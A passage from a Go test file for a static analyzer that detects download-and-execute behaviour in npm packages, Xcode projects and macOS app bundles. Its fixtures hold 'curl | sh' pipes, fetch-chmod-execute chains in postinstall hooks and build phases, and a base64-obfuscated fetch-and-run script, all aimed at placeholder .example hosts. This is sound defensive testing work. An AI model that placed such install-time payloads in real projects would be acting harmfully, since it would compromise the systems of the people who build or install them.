	assertDownloadExecuteRelationPath(t, rep, false)
	assertNoDownloadExecuteRelationPath(t, rep, true)
	assertNetworkDestination(t, rep, "https://py-noexec.example/payload")
}

func TestInspectJavaScriptDownloadTarget(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "download.js")
	body := `fs.writeFileSync("/tmp/js-payload", await fetch("https://js-download.example/payload").then(r => r.arrayBuffer()))`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/js-payload")
	assertNoOperation(t, rep, "network.connect", "network-destination", "https://js-download.example/payload")
	assertNetworkDestination(t, rep, "https://js-download.example/payload")
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("download without execution should not become download-execute: %#v", rep.Capabilities)
	}
}

func TestInspectJavaScriptSplitFetchWriteExecuteChain(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.js")
	body := strings.Join([]string{
		`const child_process = require("child_process")`,
		`const url = "https://js-split.example/payload"`,
		`const target = "/tmp/js-split-payload"`,
		`const response = await fetch(url)`,
		`fs.writeFileSync(target, Buffer.from(await response.arrayBuffer()))`,
		`fs.chmodSync(target, 0o755)`,
		`child_process.execFileSync(target)`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/js-split-payload")
	assertOperation(t, rep, "file.make-executable", "file", "/tmp/js-split-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/js-split-payload")
	assertCapability(t, rep, "macos.download-execute")
	assertDownloadExecuteRelationPath(t, rep, true)
	assertNetworkDestination(t, rep, "https://js-split.example/payload")
}

func TestInspectJavaScriptSplitFetchWriteRequiresMatchingResponseVariable(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.js")
	body := strings.Join([]string{
		`const child_process = require("child_process")`,
		`const target = "/tmp/js-split-negative-payload"`,
		`const response = await fetch("https://js-split-negative.example/payload")`,
		`fs.writeFileSync(target, Buffer.from(await other.arrayBuffer()))`,
		`child_process.execFileSync(target)`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoOperation(t, rep, "network.download", "file", "/tmp/js-split-negative-payload")
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("unmatched response body variable should not create download-execute: %#v", rep.Capabilities)
	}
	assertNetworkDestination(t, rep, "https://js-split-negative.example/payload")
}

func TestInspectJavaScriptNativeChmodDownloadExecuteChain(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.js")
	body := strings.Join([]string{
		`const child_process = require("child_process")`,
		`const url = "https://js-chmod.example/payload"`,
		`const target = "/tmp/js-chmod-payload"`,
		`fs.writeFileSync(target, await fetch(url).then(r => r.arrayBuffer()))`,
		`fs.chmodSync(target, 0o755)`,
		`child_process.execFileSync(target)`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/js-chmod-payload")
	assertOperation(t, rep, "file.make-executable", "file", "/tmp/js-chmod-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/js-chmod-payload")
	assertCapability(t, rep, "macos.download-execute")
	assertDownloadExecuteRelationPath(t, rep, true)
	assertNetworkDestination(t, rep, "https://js-chmod.example/payload")
}

func TestInspectJavaScriptNativeChmodNonExecutableMode(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.js")
	body := strings.Join([]string{
		`const child_process = require("child_process")`,
		`const url = "https://js-noexec.example/payload"`,
		`const target = "/tmp/js-noexec-payload"`,
		`fs.writeFileSync(target, await fetch(url).then(r => r.arrayBuffer()))`,
		`fs.chmodSync(target, 0o600)`,
		`child_process.execFileSync(target)`,
		"",
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertOperation(t, rep, "network.download", "file", "/tmp/js-noexec-payload")
	assertNoOperation(t, rep, "file.make-executable", "file", "/tmp/js-noexec-payload")
	assertOperation(t, rep, "process.execute", "file", "/tmp/js-noexec-payload")
	assertCapability(t, rep, "macos.download-execute")
	assertDownloadExecuteRelationPath(t, rep, false)
	assertNoDownloadExecuteRelationPath(t, rep, true)
	assertNetworkDestination(t, rep, "https://js-noexec.example/payload")
}

func TestInspectPackageNonLifecycleScriptIsNotExecutionRoot(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "package.json")
	body := `{"scripts":{"build":"curl https://build.example/p | sh","lint":"echo ok"}}`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") || hasCapability(rep, "package.package-json-lifecycle") {
		t.Fatalf("non-lifecycle scripts should not produce install-time capabilityMatches: %#v", rep.Capabilities)
	}
	assertNoExecutionRecord(t, rep, "npm-script", "build")
	assertFeature(t, rep, "package.script", "curl https://build.example/p | sh")
}

func TestInspectExecutableXcodeProjectModelsOnlyTargetRunScript(t *testing.T) {
	path := filepath.Join(t.TempDir(), "project.pbxproj")
	body := `// !$*UTF8*$!
{
	archiveVersion = 1;
	objects = {
		PROJECT = { isa = PBXProject; targets = (TARGET); };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (PHASE, SOURCES); };
		PHASE = {
			isa = PBXShellScriptBuildPhase;
			name = "Fetch helper";
			shellPath = /bin/sh;
			shellScript = "curl https://xcode-report.example/p -o /tmp/xcode-report && chmod +x /tmp/xcode-report && /tmp/xcode-report";
		};
		SOURCES = {
			isa = PBXSourcesBuildPhase;
			shellPath = /bin/sh;
			shellScript = "curl https://decoy.example/p | sh";
		};
	};
	rootObject = PROJECT;
}`
	// Real-world archives can preserve an executable mode on project metadata.
	// The suffix and structure must win over this non-semantic filesystem bit.
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.ArtifactNodes) != 1 || rep.ArtifactNodes[0].Kind != "manifest" {
		t.Fatalf("project.pbxproj was not structurally classified: %#v", rep.ArtifactNodes)
	}
	assertExecutionRecord(t, rep, "xcode-run-script", "Fetch helper")
	assertFeature(t, rep, "xcode.build_phase.shell_script", "curl https://xcode-report.example/p -o /tmp/xcode-report && chmod +x /tmp/xcode-report && /tmp/xcode-report")
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertNetworkDestination(t, rep, "https://xcode-report.example/p")
	assertNoNetworkDestination(t, rep, "https://decoy.example/p")
	assertNoOperation(t, rep, behavior.OperationProcessExecute, "file", "//")
	assertReportReferencesValid(t, rep)
}

func TestInspectXcodeRunScriptResolvesInvariantBuildSettingDeterministically(t *testing.T) {
	root := t.TempDir()
	projectDir := filepath.Join(root, "App.xcodeproj")
	if err := os.MkdirAll(projectDir, 0o700); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(projectDir, "project.pbxproj")
	body := `// !$*UTF8*$!
{
	archiveVersion = 1;
	objects = {
		PROJECT = {
			isa = PBXProject;
			mainGroup = MAIN;
			targets = (TARGET);
			buildConfigurationList = PROJECT_LIST;
		};
		TARGET = {
			isa = PBXNativeTarget;
			name = App;
			buildPhases = (PHASE);
			buildConfigurationList = TARGET_LIST;
		};
		PHASE = {
			isa = PBXShellScriptBuildPhase;
			name = "Resolve declared command";
			shellPath = /bin/sh;
			shellScript = "sh -c \"${PAYLOAD}\"";
		};
		PROJECT_LIST = {
			isa = XCConfigurationList;
			buildConfigurations = (PROJECT_DEBUG, PROJECT_RELEASE);
		};
		TARGET_LIST = {
			isa = XCConfigurationList;
			buildConfigurations = (TARGET_DEBUG, TARGET_RELEASE);
		};
		PROJECT_DEBUG = {
			isa = XCBuildConfiguration;
			name = Debug;
			buildSettings = { PAYLOAD = "curl https://xcode-setting-report.example/p | sh"; };
		};
		PROJECT_RELEASE = {
			isa = XCBuildConfiguration;
			name = Release;
			buildSettings = { PAYLOAD = "curl https://xcode-setting-report.example/p | sh"; };
		};
		TARGET_DEBUG = { isa = XCBuildConfiguration; name = Debug; baseConfigurationReference = DEBUG_CONFIG; buildSettings = {}; };
		TARGET_RELEASE = { isa = XCBuildConfiguration; name = Release; baseConfigurationReference = RELEASE_CONFIG; buildSettings = {}; };
		MAIN = { isa = PBXGroup; children = (PODS); sourceTree = "<group>"; };
		PODS = { isa = PBXGroup; children = (DEBUG_CONFIG, RELEASE_CONFIG); path = Pods; sourceTree = "<group>"; };
		DEBUG_CONFIG = { isa = PBXFileReference; path = Debug.xcconfig; sourceTree = "<group>"; };
		RELEASE_CONFIG = { isa = PBXFileReference; path = Release.xcconfig; sourceTree = "<group>"; };
	};
	rootObject = PROJECT;
}`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	podsDir := filepath.Join(root, "Pods")
	if err := os.MkdirAll(podsDir, 0o700); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"Debug.xcconfig", "Release.xcconfig"} {
		if err := os.WriteFile(filepath.Join(podsDir, name), []byte("OTHER = retained\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	first, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, first, "xcode-run-script", "Resolve declared command")
	assertFeature(t, first, "xcode.build_setting.resolved", "PAYLOAD")
	assertFeatureQualifier(t, first, "xcode.build_setting.resolved", "PAYLOAD", "configurations", "App/Debug(project),App/Release(project)")
	assertCapability(t, first, "macos.download-pipe-interpreter")
	assertCapabilityConnectivity(t, first, "macos.download-pipe-interpreter", "CONNECTED")
	assertNetworkDestination(t, first, "https://xcode-setting-report.example/p")
	baseConfigurationRelationships := 0
	for _, relationship := range first.Relationships {
		if relationship.Kind == "xcode-base-configuration" {
			baseConfigurationRelationships++
			if len(relationship.EvidenceIDs) != 2 {
				t.Fatalf("base-configuration relationship lacks exact reference and absence proofs: %#v", relationship)
			}
			var hasReference, hasAbsence bool
			for _, evidenceID := range relationship.EvidenceIDs {
				for _, item := range first.Evidence {
					if item.ID != evidenceID {
						continue
					}
					hasReference = hasReference || item.Kind == "xcode-base-configuration-reference"
					hasAbsence = hasAbsence || item.Kind == "xcode-build-setting-absence"
				}
			}
			if !hasReference || !hasAbsence {
				t.Fatalf("base-configuration relationship proof kinds are incomplete: %#v", relationship)
			}
		}
	}
	if baseConfigurationRelationships != 2 {
		t.Fatalf("base-configuration relationship count = %d, want 2: %#v", baseConfigurationRelationships, first.Relationships)
	}
	for _, operation := range first.Operations {
		if operation.Execution.Connectivity == behavior.ConnectivityConnected &&
			slices.Contains(operation.Execution.ExecutionRootIDs, "root-0001") &&
			operation.Support != behavior.SupportCorroborated {
			t.Fatalf("resolved Xcode operation support = %s, want CORROBORATED: %#v", operation.Support, operation)
		}
	}
	assertReportReferencesValid(t, first)

	var firstJSON, secondJSON bytes.Buffer
	if err := WriteJSON(&firstJSON, first); err != nil {
		t.Fatal(err)
	}
	if err := WriteJSON(&secondJSON, second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(firstJSON.Bytes(), secondJSON.Bytes()) {
		t.Fatal("resolved Xcode build-setting report is not deterministic")
	}
	reportPath := filepath.Join(root, "report.json")
	if err := os.WriteFile(reportPath, firstJSON.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(reportPath); err != nil {
		t.Fatalf("strict report reload failed: %v", err)
	}
}

func TestInspectAppNestedPackageScriptRemainsUnresolved(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Example.app")
	resources := filepath.Join(app, "Contents", "Resources", "app")
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Example</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	body := `{"scripts":{"postinstall":"sh run.sh"}}`
	if err := os.WriteFile(filepath.Join(resources, "package.json"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resources, "run.sh"), []byte("curl https://nested.example/p | sh\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "package.package-json-lifecycle") {
		t.Fatalf("nested app package script became install-time behavior: %#v", rep.Capabilities)
	}
	assertCapabilityWithConnectivity(t, rep, "macos.download-pipe-interpreter", "UNKNOWN")
	assertNoExecutionRecord(t, rep, "npm-script", "postinstall")
	assertNoExecutionRecord(t, rep, "lifecycle-target", "postinstall")
	assertFeature(t, rep, "package.script", "sh run.sh")
}

func TestInspectDirectoryRecognizesNestedPlatypusAppScriptTarget(t *testing.T) {
	root := t.TempDir()
	createPlatypusAppFixture(t, root, "Platypus.app")

	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertInvokedTargetFromAppMain(t, rep, "script", "https://platypus.example/p")
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertNetworkDestination(t, rep, "https://platypus.example/p")
	assertResource(t, rep, "macos.download-execute", "file", "/tmp/platypus")
	if !hasRelationship(rep, "bundle-script") {
		t.Fatalf("missing bundle-script relationship: %#v", rep.Relationships)
	}
	assertArtifactNode(t, rep, filepath.Base(root)+"/Platypus.app", "app-bundle")
	assertArtifactNode(t, rep, filepath.Base(root)+"/Platypus.app/Contents/Resources/AppSettings.plist", "plist")
	assertPackagingFeatureEvidence(t, rep, "Platypus", "AppSettings.plist")
}

func TestInspectRootPlatypusAppScriptTarget(t *testing.T) {
	root := t.TempDir()
	app := createPlatypusAppFixture(t, root, "RootPlatypus.app")

	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertInvokedTargetFromAppMain(t, rep, "script", "https://platypus.example/p")
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertNetworkDestination(t, rep, "https://platypus.example/p")
	assertPackagingFeatureEvidence(t, rep, "Platypus", "AppSettings.plist")
}

func TestInspectArchivedPlatypusAppScriptTarget(t *testing.T) {
	settings := `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict><key>Creator</key><string>Platypus-5.3</string><key>ScriptInterpreter</key><string>/bin/sh</string></dict></plist>`
	script := "#!/bin/sh\ncurl https://archived-platypus.example/p -o /tmp/archived-platypus\nchmod +x /tmp/archived-platypus\n/tmp/archived-platypus\n"
	path := filepath.Join(t.TempDir(), "platypus.zip")
	data := zipEntries(t, map[string][]byte{
		"Payload/Platypus.app/Contents/Info.plist":                  []byte(`<plist><dict><key>CFBundleExecutable</key><string>Runner</string></dict></plist>`),
		"Payload/Platypus.app/Contents/MacOS/Runner":                []byte("#!/bin/sh\nexit 0\n"),
		"Payload/Platypus.app/Contents/Resources/AppSettings.plist": []byte(settings),
		"Payload/Platypus.app/Contents/Resources/script":            []byte(script),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertInvokedTargetFromAppMain(t, rep, "script", "https://archived-platypus.example/p")
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertNetworkDestination(t, rep, "https://archived-platypus.example/p")
	if !hasRelationship(rep, "bundle-script") {
		t.Fatalf("missing archived bundle-script relationship: %#v", rep.Relationships)
	}
	assertPackagingFeatureEvidence(t, rep, "Platypus", "AppSettings.plist")
}

func TestInspectGenericAppSettingsScriptIsNotInvokedTarget(t *testing.T) {
	root := t.TempDir()
	app := createGenericAppSettingsScriptFixture(t, root, "Generic.app")

	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoExecutionRecord(t, rep, "app-script", "script")
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("unproven generic app script acquired execution semantics: %#v", rep.Capabilities)
	}
	assertCoverageContains(t, rep, "text-semantics", "skipped", "no trusted interpreter")
}

func createPlatypusAppFixture(t *testing.T, root, name string) string {
	t.Helper()
	settings := `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict><key>Creator</key><string>Platypus-5.3</string><key>ScriptInterpreter</key><string>/bin/sh</string></dict></plist>`
	return createAppSettingsScriptFixture(t, root, name, settings)
}

func createGenericAppSettingsScriptFixture(t *testing.T, root, name string) string {
	t.Helper()
	return createAppSettingsScriptFixture(t, root, name, "bplist00fixture")
}

func createAppSettingsScriptFixture(t *testing.T, root, name, settings string) string {
	t.Helper()
	app := filepath.Join(root, name)
	macos := filepath.Join(app, "Contents", "MacOS")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Runner</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Runner"), []byte("not a real macho"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resources, "AppSettings.plist"), []byte(settings), 0o600); err != nil {
		t.Fatal(err)
	}
	script := "echo Y3VybCBodHRwczovL3BsYXR5cHVzLmV4YW1wbGUvcCAtbyAvdG1wL3BsYXR5cHVzOyBjaG1vZCAreCAvdG1wL3BsYXR5cHVzOyAvdG1wL3BsYXR5cHVz | base64 -D | sh\n"
	if err := os.WriteFile(filepath.Join(resources, "script"), []byte(script), 0o600); err != nil {
		t.Fatal(err)
	}
	return app
}

func TestInspectPackageLifecycleNetwork(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "package.json")
	body := `{"scripts":{"postinstall":"curl https://postinstall.example/p -o /tmp/p && chmod +x /tmp/p && /tmp/p","test":"curl https://test.example"}}`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "package.package-json-lifecycle")
	assertCapability(t, rep, "macos.download-execute")
	assertNetworkDestination(t, rep, "https://postinstall.example/p")
}

func TestInspectPackageManifestKeepsDependencyAndScriptContextHonest(t *testing.T) {
	root := t.TempDir()
	pkg := `{
  "dependencies":{"plain-crypto-js":"4.2.1"},
  "scripts":{
    "postinstall":"node setup.js",
    "test":"curl https://not-install.example/payload | sh"
  }
}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}

	var dependencyFound, lifecycleFound, unrelatedFound bool
	for _, feature := range rep.Features {
		switch {
		case feature.Key == "package.dependency" && feature.Value == "plain-crypto-js":
			dependencyFound = feature.Qualifiers["section"] == "dependencies" && feature.Qualifiers["specifier"] == "4.2.1" && feature.Execution.Connectivity == behavior.ConnectivityUnknown
		case feature.Key == "package.script" && feature.Qualifiers["name"] == "postinstall":
			lifecycleFound = feature.Execution.Connectivity == behavior.ConnectivityConnected && len(feature.Execution.ExecutionRootIDs) == 1
		case feature.Key == "package.script" && feature.Qualifiers["name"] == "test":
			unrelatedFound = feature.Execution.Connectivity == behavior.ConnectivityUnknown
		}
	}
	if !dependencyFound || !lifecycleFound || !unrelatedFound {
		t.Fatalf("package manifest facts lost exact context: dependency=%v lifecycle=%v unrelated=%v features=%#v", dependencyFound, lifecycleFound, unrelatedFound, rep.Features)
	}
	assertCoverageContains(t, rep, "package-script-target-resolution", "partial", "concrete local lifecycle targets were absent")
	assertNoNetworkDestination(t, rep, "https://not-install.example/payload")
}

func TestInspectNodePackageManifestMetadataIsStaticOnlyAndDeterministic(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "package.json")
	body := `{"name":"manifest-fact-fixture","version":"1.2.3","type":"module","main":"dist/main.js","exports":"./dist/index.js"}`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	first, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}

	want := map[string]string{
		"package.name:":                   "manifest-fact-fixture",
		"package.version:":                "1.2.3",
		"node.package.type:":              "module",
		"node.package.entrypoint:main":    "dist/main.js",
		"node.package.entrypoint:exports": "./dist/index.js",
	}
	seen := make(map[string]string, len(want))
	for _, feature := range first.Features {
		field := feature.Qualifiers["field"]
		key := feature.Key + ":" + field
		if _, tracked := want[key]; !tracked {
			continue
		}
		if feature.Support != behavior.SupportDirect || feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(feature.Execution.ExecutionRootIDs) != 0 || len(feature.Execution.InvokedTargetIDs) != 0 {
			t.Fatalf("manifest fact became execution-backed: %#v", feature)
		}
		seen[key] = feature.Value
	}
	if !reflect.DeepEqual(seen, want) {
		t.Fatalf("manifest facts = %#v, want %#v", seen, want)
	}
	if len(first.ExecutionRoots) != 0 || len(first.InvokedTargets) != 0 || len(first.Operations) != 0 || len(first.Capabilities) != 0 {
		t.Fatalf("metadata-only package became executable behavior: roots=%#v targets=%#v operations=%#v capabilities=%#v", first.ExecutionRoots, first.InvokedTargets, first.Operations, first.Capabilities)
	}
	assertReportReferencesValid(t, first)

	var concise strings.Builder
	if err := WriteTextWithOptions(&concise, first, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	for _, hidden := range []string{"package.name", "package.version", "node.package.type", "node.package.entrypoint", "manifest-fact-fixture", "./dist/index.js"} {
		if strings.Contains(concise.String(), hidden) {
			t.Errorf("metadata-only declaration %q added default concise noise:\n%s", hidden, concise.String())
		}
	}

	var firstJSON, secondJSON bytes.Buffer
	if err := WriteJSON(&firstJSON, first); err != nil {
		t.Fatal(err)
	}
	if err := WriteJSON(&secondJSON, second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(firstJSON.Bytes(), secondJSON.Bytes()) {
		t.Fatal("node package manifest report is not deterministic")
	}
	reportPath := filepath.Join(root, "report.json")
	if err := os.WriteFile(reportPath, firstJSON.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(reportPath); err != nil {
		t.Fatalf("strict report reload failed: %v", err)
	}
}

func TestInspectNodePackageRootEntrypointIsConditionalAndReloadable(t *testing.T) {
	root := t.TempDir()
	dist := filepath.Join(root, "dist")
	if err := os.MkdirAll(dist, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(`{"name":"@fixture/entry","main":"dist/index.js"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dist, "index.js"), []byte(`const cp = require("child_process"); cp.exec("curl https://node-package.example.invalid/p | sh");`), 0o600); err != nil {
		t.Fatal(err)
	}

	first, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	var selectedNodeID string
	for _, node := range first.ArtifactNodes {
		if strings.HasSuffix(node.LogicalPath, "/dist/index.js") {
			selectedNodeID = node.ID
		}
	}
	var rootID, declarationNodeID string
	for _, executionRoot := range first.ExecutionRoots {
		if executionRoot.Kind != "node-package-root-load" {
			continue
		}
		rootID = executionRoot.ID
		declarationNodeID = executionRoot.DeclarationNodeID
		if executionRoot.Name != "@fixture/entry" || executionRoot.Interpreter != "node" ||
			executionRoot.StartNodeID != selectedNodeID || len(executionRoot.Arguments) != 0 {
			t.Fatalf("package-root report lost exact bounded semantics: %#v", executionRoot)
		}
	}
	if rootID == "" {
		t.Fatalf("missing package-root execution root: %#v", first.ExecutionRoots)
	}
	for _, feature := range first.Features {
		if feature.NodeID == declarationNodeID && (feature.Key == "package.name" || feature.Key == "node.package.entrypoint") &&
			(feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(feature.Execution.ExecutionRootIDs) != 0) {
			t.Fatalf("manifest inventory gained root ownership: %#v", feature)
		}
	}
	connected := false
	for _, operation := range first.Operations {
		if operation.Execution.Connectivity == behavior.ConnectivityConnected && slices.Contains(operation.Execution.ExecutionRootIDs, rootID) {
			connected = true
		}
	}
	if !connected {
		t.Fatalf("selected entry operations were not connected to %q: %#v", rootID, first.Operations)
	}
	assertCapabilityWithConnectivity(t, first, "macos.download-pipe-interpreter", "CONNECTED")
	if hasCapability(first, "package.package-json-lifecycle") || len(first.InvokedTargets) != 0 {
		t.Fatalf("ordinary package load was confused with lifecycle invocation: capabilities=%#v targets=%#v", first.Capabilities, first.InvokedTargets)
	}
	assertCoverageContains(t, first, "node-package-entry-resolution", "analyzed", "does not establish that a package request occurred")
	assertCoverageContains(t, first, "node-package-module-resolution", "partial", "transitive require/import resolution")
	assertReportReferencesValid(t, first)

	var firstJSON, secondJSON bytes.Buffer
	if err := WriteJSON(&firstJSON, first); err != nil {
		t.Fatal(err)
	}
	if err := WriteJSON(&secondJSON, second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(firstJSON.Bytes(), secondJSON.Bytes()) {
		t.Fatal("Node package-root report is not deterministic")
	}
	reportPath := filepath.Join(t.TempDir(), "report.json")
	if err := os.WriteFile(reportPath, firstJSON.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(reportPath); err != nil {
		t.Fatalf("strict Node package-root report reload failed: %v", err)
	}
}

func TestInspectRemotePackageDependencyIsVisibleWithoutExecutionPromotion(t *testing.T) {
	root := t.TempDir()
	const specifier = "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
	pkg := `{"optionalDependencies":{"@tanstack/setup":"` + specifier + `"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	var dependency *behavior.Feature
	for i := range rep.Features {
		feature := &rep.Features[i]
		if feature.Key == "package.dependency" && feature.Value == "@tanstack/setup" {
			dependency = feature
			break
		}
	}
	if dependency == nil ||
		dependency.Qualifiers["section"] != "optionalDependencies" ||
		dependency.Qualifiers["specifier"] != specifier ||
		dependency.Support != behavior.SupportDirect ||
		dependency.Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("remote dependency feature lost direct declaration context: %#v", dependency)
	}
	if len(rep.ExecutionRoots) != 0 || len(rep.InvokedTargets) != 0 || len(rep.Operations) != 0 || len(rep.Capabilities) != 0 {
		t.Fatalf(
			"remote dependency declaration became executable behavior: roots=%#v targets=%#v operations=%#v capabilities=%#v",
			rep.ExecutionRoots,
			rep.InvokedTargets,
			rep.Operations,
			rep.Capabilities,
		)
	}

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"VCS/URL dependency",
		"@tanstack/setup -> github:tanstack/router#79ac49ee",
	} {
		if !strings.Contains(output.String(), want) {
			t.Errorf("concise report omitted remote dependency %q:\n%s", want, output.String())
		}
	}
}

func TestInspectPackageLifecycleLocalScriptTarget(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "scripts"), 0o700); err != nil {
		t.Fatal(err)
	}
	pkg := `{"scripts":{"postinstall":"sudo -E node scripts/install.js"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	body := `fetch("https://helper.example/payload")`
	if err := os.WriteFile(filepath.Join(root, "scripts", "install.js"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "lifecycle-target", "postinstall")
	assertCapability(t, rep, "package.package-json-lifecycle")
	assertCapabilityWithConnectivity(t, rep, "package.package-json-lifecycle", "CONNECTED")
	assertNetworkDestination(t, rep, "https://helper.example/payload")
}

func TestInspectPackageLifecycleNodePreloadAndScriptTargets(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "scripts"), 0o700); err != nil {
		t.Fatal(err)
	}
	pkg := `{"scripts":{"postinstall":"node --require scripts/preload.js scripts/install.js"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "scripts", "preload.js"), []byte(`fetch("https://node-preload-hook.example/api")`), 0o600); err != nil {
